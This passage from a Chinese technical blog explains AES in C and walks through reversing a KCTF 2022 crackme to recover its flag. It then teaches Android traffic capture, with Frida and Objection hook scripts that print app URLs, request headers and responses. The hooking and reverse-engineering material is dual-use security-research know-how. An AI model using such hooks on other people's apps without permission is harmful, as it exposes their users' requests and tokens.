","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:5","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"轮密相加(addRoundKey) 将状态数组中的元素与轮密钥通过简单的异或运算相加.轮密钥是由用户输入的密钥通过密钥扩展生成的,同样可以看成一个状态数组. 其代码表示如下: #define BYTE(x, n) (((x) \u003e\u003e (8 * (n))) \u0026 0xff) void addRoundKey(uint8(*state)[4], const uint32* key) { uint8 k[4][4]; /* i: row, j: col */ for (int i = 0; i \u003c 4; ++i) { for (int j = 0; j \u003c 4; ++j) { k[i][j] = (uint8)BYTE(key[j], 3 - i); /* copy uint32 key[4] to uint8 k[4][4] */ state[i][j] ^= k[i][j]; } } } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:2:6","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"解密过程 ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"总体 加密算法的逆过程就是解密算法.因此,解密算法的轮函数也是由4部分组成,分别是invShiftRows、invSubBytes、invMixColumns、addRoundKey. 其解密过程的伪代码如下: //对AES-128解密来说, Nk = 4, Nb = 4, Nr = 10 void AES_XXX_Decrypt(uint8 in[4 * Nb], uint8 out[4 * Nb], uint8 key[4 * Nk]) { //将输入复制到状态数组 uint8 state[4 * Nb] = in; //密钥扩展 uint32 dw[Nb * (Nr + 1)] = keyExpansion(key[4 * Nk]); //轮密相加 //此时使用的秘钥是加密时使用秘钥的倒序 addRoundKey(state, dw); for (int i = 1; i \u003c 10; ++i) { dw += 4; invSubBytes(state); invShiftRows(state); addRoundKey(state, dw); invMixColumns(state); } invSubBytes(state); invShiftRows(state); addRoundKey(state, dw + 4); out = state; } ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:1","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"密钥扩展(keyExpansion) 加密过程中的密钥扩展结果倒序就是解密过程中使用的密钥. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:2","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"逆字节代换(invSubBytes) 是字节代换的逆过程,和字节代换一样,逆字节代换只进行简单的查表操作. AES同时定义了一个逆S盒(Inverse S-Box). ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:3","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"逆行移位(invShiftRows) 是行移位的逆过程,即状态数组中的后3行执行相应的右移操作. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:4","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"逆列混合(invMixColumns) 和列混合的原理相同,区别在于它们使用了不同的多项式.逆列混合使用的系数矩阵如下: uint8_t M[4][4] = {{0x0E, 0x0B, 0x0D, 0x09}, {0x09, 0x0E, 0x0B, 0x0D}, {0x0D, 0x09, 0x0E, 0x0B}, {0x0B, 0x0D, 0x09, 0x0E}}; 它与列混合使用的矩阵互为逆矩阵. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:5","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"轮密相加(addRoundKey) 轮密相加的逆过程就是它本身,因为异或操作是其本身的逆. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:3:6","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"实战演练 ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"选题 本题选自2022年看雪KCTF的第三题-石像病毒.这是一道利用Windows异常机制来修改标准算法,考察选手对加密算法的熟悉程度. 2022-KCTF-第三题-石像病毒.rar ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:1","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"总体 首先经过简单动态调试,去掉Main函数异常干扰代码,IDA反编译结果如下: int __cdecl main_0(int argc, const char **argv, const char **envp) { void *v3; // esp int result; // eax char v5; // [esp-10h] [ebp-1048h] struc_Luo Src; // [esp+0h] [ebp-1038h] BYREF CPPEH_RECORD ms_exc; // [esp+1020h] [ebp-18h] v3 = alloca(0x1020); memset(\u0026Src, 0xCCu, sizeof(Src)); ms_exc.registration.ScopeTable = (PSCOPETABLE_ENTRY)((int)ms_exc.registration.ScopeTable ^ __security_cookie); memset(Src.szFlag_78, 0, sizeof(Src.szFlag_78)); Src.result_48 = 0; Src.field_4C = 0; Src.field_50 = 0; Src.field_54 = 0; Src.field_58 = 0; Src.field_5C = 0; Src.field_60 = 0; Src.field_64 = 0; Src.field_68 = 0; Src.field_6C = 0; gets_s(Src.szFlag_78, 0xFA0u); if ( strlen(Src.szFlag_78) == 0x20 ) { Src.field_40 = 0x200; strcpy(\u0026Src.field_24, \"Enj0y_1t_4_fuuuN\"); *(_WORD *)((char *)\u0026Src.field_34 + 1) = 0; HIBYTE(Src.field_34) = 0; Src.field_8 = 0; Src.field_C = 0; Src.field_10 = 0; Src.field_14 = 0; Src.field_18 = 0; Src.field_0 = 0x200; sub_401109(\u0026Src.field_24, 0x10u, (int)\u0026Src.field_8);// MD5 sub_401104(\u0026Src.field_8, 0x10u, (int)Src.szFlag_78, (int)\u0026Src.result_48, 0x20);// AES if ( !memcmp(\u0026Src.result_48, byte_40B200, 0x20u) ) printf(\"OK\\n\", v5); else printf(\"NO\\n\", v5); result = 0; } else { printf(\"NO\\n\", v5); result = 0; } return result; } 可以看到本题简单明了,首先要求我们输入的字符串长度等于0x20,然后通过对字符串\"Enj0y_1t_4_fuuuN\"计算MD5值,将其作为密钥,利用AES算法加密我们输入的值,看是否和内置的值相同.若相同,则正确.不过需要注意的是,这里用到MD5和AES都是利用了Windows异常机制对其标准过程进行了修改. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:2","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"MD5 利用IDA插件Findcrypt查找算法常量. 交叉引用MD5相关算法常量. .text:00402C60 sub_402C60 proc near ; CODE XREF: sub_4010FA↑j .text:00402C60 push ebp .text:00402C61 mov ebp, esp .text:00402C63 mov eax, 4 .text:00402C68 imul ecx, eax, 2Ah ; '*' .text:00402C6B mov MD5_Constants_40B298[ecx], 0D4AF3085h .text:00402C75 mov eax, 1 .text:00402C7A pop ebp .text:00402C7B retn .text:00402C7B sub_402C60 endp 发现这里修改了MD5常量表中的第(0x2A + 1 = 43)项的值为0x0D4AF3085. 验证. 在x64Dbg中定位到sub_401109函数,看魔改后的MD5计算出来的值. 可以看到上面计算出来的值为:2F65B1FF31ED86D09A285C0F4048059D 找一份标准MD5算法,修改常量表的第43项值为0x0D4AF3085,然后查看是否和上面计算出来的结果相同. ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:3","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"AES 总体 首先利用程序中的特征,在Github上搜索一份跟程序中相近的AES源码. https://github.com/lmshao/AES AES-master.zip 在IDA中查看下AES相关函数. int __cdecl sub_401104(void *Src, size_t Size, int a3, int a4, int a5) { return sub_402070((uint8_t *)Src, Size, (uint8_t *)a3, (uint8_t *)a4, a5); } int __cdecl sub_402070(uint8_t *key, size_t keyLen, uint8_t *in, uint8_t *out, int inLen) { int j; // [esp+4h] [ebp-1C8h] unsigned int i; // [esp+8h] [ebp-1C4h] int v8[6]; // [esp+10h] [ebp-1BCh] BYREF int state[11]; // [esp+28h] [ebp-1A4h] BYREF char *v10; // [esp+54h] [ebp-178h] uint8_t *_out; // [esp+58h] [ebp-174h] char v12[360]; // [esp+60h] [ebp-16Ch] BYREF _out = out; v10 = v12; state[6] = 0; state[7] = 0; state[8] = 0; state[9] = 0; state[0] = 0; state[1] = 0; state[2] = 0; state[3] = 0; v8[0] = 0; v8[1] = 0; v8[2] = 0; v8[3] = 0; if ( !key || !in || !out ) return 0xFFFFFFFF; if ( keyLen \u003e 0x10 ) return 0xFFFFFFFF; if ( inLen % 0x10u ) return 0xFFFFFFFF; memcpy(state, key, keyLen); // 密钥长度是0x10,可以看出用的是AES-128加密 keyExpansion_4010BE((int)state, 0x10, (int)v12);// 密钥扩展 for ( i = 0; i \u003c inLen; i += 0x10 ) { sub_401145((uint8_t *)v8, in); addRoundKey_401186(v8, v10); // 轮密相加 for ( j = 1; j \u003c 0xA; ++j ) // 轮数(Nr) = 10,可以也看出这里用的是AES-128加密 { v10 += 0x10; subBytes_401172((int)v8); // 字节代换 sub_40122B((int)v8); mixColumns_40100F((int)v8); // 列混合 addRoundKey_401186(v8, v10); // 轮密相加 } subBytes_401172((int)v8); sub_40122B((int)v8); addRoundKey_401186(v8, v10 + 0x10); sub_40125D((int)v8, _out); _out += 0x10; in += 0x10; v10 = v12; } return 0; } 这里我们输入的字符串是\"XiaLuoHun12345675434567876543Hun\",长度是0x20. 密钥扩展 用IDA查看密钥扩展函数. 切换到反汇编窗口,可以看到有两处异常. 接下来查看下异常处理代码. int sub_40108C() { return sub_402330(); } int sub_402330() { RijnDael_AES_LONG_40B000[0x71] ^= RijnDael_AES_LONG_40B000[0xA3]; RijnDael_AES_LONG_40B000[0xA3] ^= RijnDael_AES_LONG_40B000[0x71]; RijnDael_AES_LONG_40B000[0x71] ^= RijnDael_AES_LONG_40B000[0xA3]; return 1; } 可以发现这里修改了AES的S-Box,以上修改相当于在标准AES算法源码中修改如下: int keyExpansion(const uint8_t *key, uint32_t keyLen, AesKey *aesKey) { if (NULL == key || NULL == aesKey){ printf(\"keyExpansion param is NULL\\n\"); return -1; } if (keyLen != 16){ printf(\"keyExpansion keyLen = %d, Not support.\\n\", keyLen); return -1; } uint32_t *w = aesKey-\u003eeK; uint32_t *v = aesKey-\u003edK; /* keyLen is 16 Bytes, generate uint32_t W[44]. */ /* W[0-3] */ for (int i = 0; i \u003c 4; ++i) { LOAD32H(w[i], key + 4*i); } /* W[4-43] */ for (int i = 0; i \u003c 10; ++i) { //修改开始------------ S[0x71] ^= S[0xA3]; S[0xA3] ^= S[0x71]; S[0x71] ^= S[0xA3]; //修改结束----------- w[4] = w[0] ^ MIX(w[3]) ^ rcon[i]; w[5] = w[1] ^ w[4]; w[6] = w[2] ^ w[5]; w[7] = w[3] ^ w[6]; w += 4; } w = aesKey-\u003eeK+44 - 4; for (int j = 0; j \u003c 11; ++j) { //修改开始------------ S[0x71] ^= S[0xA3]; S[0xA3] ^= S[0x71]; S[0x71] ^= S[0xA3]; //修改结束----------- for (int i = 0; i \u003c 4; ++i) { v[i] = w[i]; } w -= 4; v += 4; } //修改开始------------ //根据S-Box计算逆S-Box calc_InvS_Box(); //修改结束----------- return 0; } 需要注意的是修改了AES的S-Box,我们也要同步修改AES的inv_S-Box. //由AES的S盒计算逆S盒. void calc_InvS_Box() { unsigned char sbox_inv[256] = { 0 }; for (int i = 0; i \u003c 256; i++) { unsigned char temp1 = S[i]; inv_S[temp1] = i; } } 行移位 用IDA查看下与行移位相关的代码. 既然F5不行,那就切换到反汇编窗口看下. 这里我们注意到用到了右移,正常来说加密过程中的行移位用的是左移,解密过程中用的是右移.再加上动态调试结果,确认这里是将标准AES加密过程中的行移位修改为了逆行移位.与此同时需要修改解密过程中的逆行移位为行移位. 列混合 用IDA伪代码查看列混合中的Gmul函数好像没问题,但切到汇编窗口就会看到有异常处理. int sub_401249() { return sub_4023D0(); } int sub_4023D0() { byte_40B200[0x10] = 0xF4; byte_40B200[0x11] = 0xF2; return 1; } byte_40B200里面存放的是最终AES计算出来的结果要比对的值,在这里进行了修改. 计算Flag 既然知道了程序修改标准算法的地方,那我们就来写代码计算下Flag. 最终得到的Flag为:flag{db5c6a8dfec4d0ec5569899640} 相关资料 源码和IDB.7z ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:4:4","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["加密算法"],"content":"参考链接 \u003c加密与解密第4版\u003e https://www.csdn.net/tags/MtTaEgwsNTY5MTQyLWJsb2cO0O0O.html https://blog.csdn.net/shaosunrise/article/details/80219950 https://blog.csdn.net/qq_28205153/article/details/55798628 https://github.com/lmshao/AES https://github.com/SergeyBel/AES ","date":"2022-06-02","objectID":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/:5:0","tags":["AES"],"title":"AES","uri":"/posts/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/aes/"},{"categories":["Android 抓包"],"content":"Hook抓包实战之Http(s)网络框架分析 ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:0:0","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"HttpURLConnection ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:1:0","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"开发流程 配置 需在AndroidManifest.xml文件赋予权限: \u003cuses-permissionandroid:name=\"android.permission.INTERNET\"/\u003e 布局 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cLinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" android:gravity=\"center|center_horizontal|center_vertical\" tools:context=\".MainActivity\"\u003e \u003cButton android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:gravity=\"center|center_horizontal|center_vertical\" android:id=\"@+id/mybtn\" android:text=\"发送请求\" android:textSize=\"45sp\"\u003e \u003c/Button\u003e \u003c/LinearLayout\u003e 代码 package com.example.luodst; import androidx.annotation.NonNull; import androidx.appcompat.app.AlertDialog; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.os.Handler; import android.os.Message; import android.util.Log; import android.view.View; import android.widget.Button; import java.io.IOException; import java.io.InputStream; import java.net.HttpURLConnection; import java.net.MalformedURLException; import java.net.ProtocolException; import java.net.URL; public class MainActivity extends AppCompatActivity { private static String TAG = \"XiaLuoHun\"; private Handler handler = null; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); initHandler(); // 定位发送请求按钮 Button btn = findViewById(R.id.mybtn); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { getResponse(\"http://www.baidu.com\"); } }); } private void httpUrlConnection(String strUrl){ try { URL url = new URL(strUrl); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); //设置Http请求方法 connection.setRequestMethod(\"GET\"); //设置请求参数 connection.setRequestProperty(\"token\",\"LuoHun\"); //设置连接超时时间 connection.setConnectTimeout(8000); //设置接收超时时间 connection.setReadTimeout(8000); // 开始连接 connection.connect(); //得到响应码 //int responseCode = connection.getResponseCode(); /* if(responseCode == HttpURLConnection.HTTP_OK){ //... }*/ //获取服务器返回的输入流 InputStream in = connection.getInputStream(); //if(in.available() \u003e 0){ // 每次写入1024字节 int bufferSize = 1024; byte[] buffer = new byte[bufferSize]; StringBuffer sb = new StringBuffer(); while ((in.read(buffer)) != -1) { sb.append(new String(buffer)); } sendMsg(sb.toString()); //Log.d(\"LuoHun\", sb.toString()); //关闭Http连接 connection.disconnect(); // } } catch (IOException e) { e.printStackTrace(); } } private void getResponse(String strUrl) { new Thread(new Runnable() { @Override public void run() { httpUrlConnection(strUrl); } }).start(); } private void initHandler() { handler = new Handler(getMainLooper(), new Handler.Callback() { @Override public boolean handleMessage(@NonNull Message msg) { if (msg.what == 1){ AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this); builder.setTitle(\"NOTICE\"); builder.setMessage((String) msg.obj); builder.setPositiveButton(\"Confirm\",null); builder.create().show(); } return false; } }); } private void sendMsg(String message){ Message msg = new Message(); msg.what = 1; msg.obj = message; handler.sendMessage(msg); } } HttpURLConnectionDemo.7z ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:1:1","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"“自吐\"脚本开发 观察上面的开发流程,我们发现几个关键函数: URL类的构造函数,其包含了目标网址的字符串. setRequestMethod和setRequestProperty函数设置请求头和请求参数等信息. getInputStream函数获取response. Hook URL 使用Objection来Hook URL类的构造函数,测试下. android hooking watch class_method java.net.URL.$init --dump-args --dump-backtrace --dump-return 可以看到出现了网址. 编写\"自吐\"脚本. function main(){ Java.perform(function(){ var URL = Java.use('java.net.URL') URL.$init.overload('java.lang.String').implementation = function(urlstr){ console.log('url =\u003e ', urlstr) var result = this.$init(urlstr) return result } }) } setImmediate(main) Hook HttpURLConnection 前期研究 使用Objection Hook HttpURLConnection整个类和构造函数来看下. android hooking watch class java.net.HttpURLConnection android hooking watch class_method java.net.HttpURLConnection.$init --dump-args -- dump-backtrace --dump-return(agent) 发现只有java.net.HttpURLConnection.getFollowRedirects()和HttpURLConnection的构造函数被调用了. 使用Objection在堆上寻找HttpURLConnection实例. android heap search instances java.net.HttpURLConnection 发现不存在任何实例. 查询Android源码可以知道,HttpURLConnection类是一个抽象类,在开发中虽然可以直接使用抽象类去表示,但是在运行过程中是抽象类的具体实现类在工作. 确定HttpURLConnection的具体实现类. 我们注意到第一次出现HttpURLConnection的定义是通过URL类的openConnection()函数完成的,这个函数返回值的类名就是HttpURLConnection的具体实现类,那么我们可以使用Frida来打印openConnection()函数返回值的类名,从而获取HttpURLConnection的具体实现类. function main(){ Java.perform(function(){ var URL = Java.use('java.net.URL') URL.openConnection.overload().implementation = function(){ var result = this.openConnection() console.log('openConnection returnType =\u003e ', result.$className) return result } }) } setImmediate(main) 最终得到HttpURLConnection抽象类的具体实现类为com.android.okhttp.internal.huc.HttpURLConnectionImpl 使用Objection来对HttpURLConnection具体实现类整体进行Hook测试下. android hooking watch class com.android.okhttp.internal.huc.HttpURLConnectionImpl 可以发现,这下上述Demo中使用的每个函数都被调用到了. “自吐\"脚本 function main(){ Java.perform(function(){ var HttpsURLConnectionImpl = Java.use('com.android.okhttp.internal.huc.HttpURLConnectionImpl') //打印请求参数 HttpsURLConnectionImpl.setRequestProperty.implementation = function(key, value){ var result = this.setRequestProperty(key, value) console.log('setRequestProperty =\u003e ',key,': ', value) return result } }) } setImmediate(main) ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:1:2","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"okhttp3 ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:2:0","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"开发流程 配置 添加权限. 需在AndroidManifest.xml文件赋予权限: \u003cuses-permissionandroid:name=\"android.permission.INTERNET\"/\u003e 在build.gradle文件中添加okhttp3支持. implementation(\"com.squareup.okhttp3:okhttp:3.12.0\") 布局 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cLinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" android:gravity=\"center|center_horizontal|center_vertical\" tools:context=\".MainActivity\"\u003e \u003cButton android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:gravity=\"center|center_horizontal|center_vertical\" android:id=\"@+id/mybtn\" android:text=\"发送请求\" android:textSize=\"45sp\"\u003e \u003c/Button\u003e \u003c/LinearLayout\u003e 代码 okHttpExample.java package com.example.luodst; import android.util.Log; import java.io.IOException; import java.util.concurrent.TimeUnit; import okhttp3.Call; import okhttp3.Callback; import okhttp3.OkHttpClient; import okhttp3.Request; import okhttp3.Response; public class okHttpExample { private static final String TAG = \"XiaLuoHun\"; // 新建一个Okhttp客户端 OkHttpClient client = new OkHttpClient(); // 新建一个Okhttp客户端 /* OkHttpClient client = new OkHttpClient.Builder() //新建一个拦截器 // .addNetworkInterceptor(new LoggingInterceptor()) //设置读超时 .readTimeout(5, TimeUnit.SECONDS) //设置写超时 .writeTimeout(5, TimeUnit.SECONDS) //设置连接超时 .connectTimeout(15, TimeUnit.SECONDS) //设置是否自动重连 .retryOnConnectionFailure(false) .build();*/ void run(String url) throws IOException { // 构造request Request request = new Request.Builder() .url(url) .header(\"token\",\"LuoHun\") .build(); // 发起异步请求 client.newCall(request).enqueue( new Callback() { @Override public void onFailure(Call call, IOException e) { call.cancel(); } @Override public void onResponse(Call call, Response response) throws IOException { //打印输出 Log.d(TAG, response.body().string()); } } ); } } MainActivity.java package com.example.luodst; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; import android.view.View; import android.widget.Button; import java.io.IOException; import java.io.InputStream; import java.net.HttpURLConnection; import java.net.MalformedURLException; import java.net.ProtocolException; import java.net.URL; public class MainActivity extends AppCompatActivity { private static String TAG = \"XiaLuoHun\"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); // 定位发送请求按钮 Button btn = findViewById(R.id.mybtn); btn.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { // 访问百度首页 String requestUrl = \"https://www.baidu.com/\"; okHttpExample myExample = new okHttpExample(); try { myExample.run(requestUrl); } catch (IOException e) { e.printStackTrace(); } } }); } } ","date":"2022-05-29","objectID":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/:2:1","tags":["抓包"],"title":"Http(s)网络框架分析","uri":"/posts/android/android%E6%8A%93%E5%8C%85/hook%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E4%B9%8Bhttps%E7%BD%91%E7%BB%9C%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"},{"categories":["Android 抓包"],"content":"“自吐\"脚本开发 初步研究 观察上述开发流程,假如我们想要获取请求的数据,我们可以Hook okhttp3.OkHttpClient.newCall()函数. 先使用Objection进行快速Hook,测试下. JavaScript代码. function main(){ Java.perform(function(){ var OkHttpClient = Java.use('okhttp3.OkHttpClient') OkHttpClient.newCall.implementation = function(request){ var result = this.newCall(request) console.log(request.toString()) return result } }) } setImmediate(main) 这里需要提一点,上述Hook点是有问题的,可能出现遗漏或多出部分请求,因为存在\"Call\"后没有发出实际请求的情况.观察上述开发流程,发现只有Hook execute()和enqueue(new Callback())才能真正保证每个从okhttp出去的请求都能被获取.但即便如此,按这个流程走,只能看到request,无法同时看到返回的响应,这是有问题的.我们可以采用okhttp拦截器Interceptor来解决这个问题. okhttp拦截器机制 拦截器可以对request做出修改.在数据返回时再对request做出修改. 整个拦截器机制实际上是一个链条,在网络请求传输过程中,最上层的拦截器首先向下传递一个request,并请求下层拦截器返回一个response,下层的拦截器收到request继续向下传递,并请求返回response,直到传递到最后一个拦截器,它对这个request进行处理并返回一个response,然后这个response开始层层向上传递,直到传递到最上层.这样最上层的拦截器就得到了response,整个过程形成一个拦截器的完整递归调用链. 上述流程可以查看okhttp源码中的getResponseWithInterceptorChain()函数. 进一步研究 接下来我们修改上述Demo,添加一个拦截器来打印URL和请求头. 新建一个类LoggingInterceptor继承Interceptor. package com.example.luodst; import android.util.Log; import java.io.IOException; import okhttp3.Interceptor; import okhttp3.Request; import okhttp3.Response; public class LoggingInterceptor implements Interceptor { private static String TAG = \"XiaLuoHun\"; @Override public Response intercept(Chain chain) throws IOException { Request request = chain.request(); Log.i(TAG, \"请求URL: \" + String.valueOf(request.url()) + \"\\n\"); Log.i(TAG, \"请求头: \" + \"\\n\" + String.valueOf(request.headers()) + \"\\n\"); Response response = chain.proceed(request); return response; } } 在okHttpExample.java中添加一个拦截器. //方式一 // 新建一个Okhttp客户端 OkHttpClient client = new OkHttpClient.Builder() //新建一个拦截器 .addNetworkInterceptor(new LoggingInterceptor()) //设置读超时 .readTimeout(5, TimeUnit.SECONDS) //设置写超时 .writeTimeout(5, TimeUnit.SECONDS) //设置连接超时 .connectTimeout(15, TimeUnit.SECONDS) //设置是否自动重连 .retryOnConnectionFailure(false) .build(); //方式二 OkHttpClient client = new OkHttpClient(); OkHttpClient newClient = client.newBuilder() .addInterceptor(new LoggingInterceptor()) .build(); 查看日志输出. 需要注意的是上述只打印了请求信息,并没有打印response.是因为此时response对象还需进一步处理.这些前人已经替我们完成了,okhttp官方还提供了一个日志拦截打印器(okhttp3:logging-interceptor).接下来对官方的代码稍作修改,并替换上述的LoggingInterceptor类即可. 下方的代码就是对头部信息进行处理,并添加对response的处理和打印. package com.example.luodst; import android.util.Log; import java.io.EOFException; import java.io.IOException; import java.nio.charset.Charset; import java.util.concurrent.TimeUnit; import okhttp3.Connection; import okhttp3.Headers; import okhttp3.Interceptor; import okhttp3.MediaType; import okhttp3.Request; import okhttp3.RequestBody; import okhttp3.Response; import okhttp3.ResponseBody; import okhttp3.internal.http.HttpHeaders; import okio.Buffer; import okio.BufferedSource; import okio.GzipSource; public class LoggingInterceptor implements Interceptor { private static final String TAG = \"okhttpGET\"; private static final Charset UTF8 = Charset.forName(\"UTF-8\"); @Override public Response intercept(Chain chain) throws IOException { Request request = chain.request(); RequestBody requestBody = request.body(); boolean hasRequestBody = requestBody != null; Connection connection = chain.connection(); String requestStartMessage = \"--\u003e \" + request.method() + ' ' + request.url(); Log.e(TAG, requestStartMessage); if (hasRequestBody) { // Request body headers are only present when installed as a network interceptor. Force // them to be included (when available) so there values are known. if (requestBody.contentType() != null) { Log.e(TAG, 